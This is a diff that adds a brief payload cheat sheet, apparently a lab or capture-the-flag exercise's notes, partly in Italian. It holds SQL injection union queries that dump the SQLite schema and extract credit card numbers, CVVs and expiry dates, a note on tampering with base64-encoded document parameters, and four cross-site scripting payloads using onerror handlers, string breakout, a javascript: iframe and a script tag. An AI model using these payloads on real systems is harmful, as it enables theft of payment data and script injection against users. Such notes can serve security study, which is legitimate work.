@@ -1,0 +1,11 @@
+database:
+' and 1=0 union SELECT name, sql FROM sqlite_master -- 
+' and 1=0 union SELECT number, cvv FROM cards -- 
+' and 1=0 union SELECT cvv, expire FROM cards -- 
+
+documenti : decode base64, cambia tipo, encode base64
+
+xss1: " onerror=alert(1)>.png
+xss2: ') || alert(1); ('
+xss3: read/test"> <iframe src="javascript:alert(1)" <
+xss4: send?email=<script>onerror{=alert; throw "xss";</script>
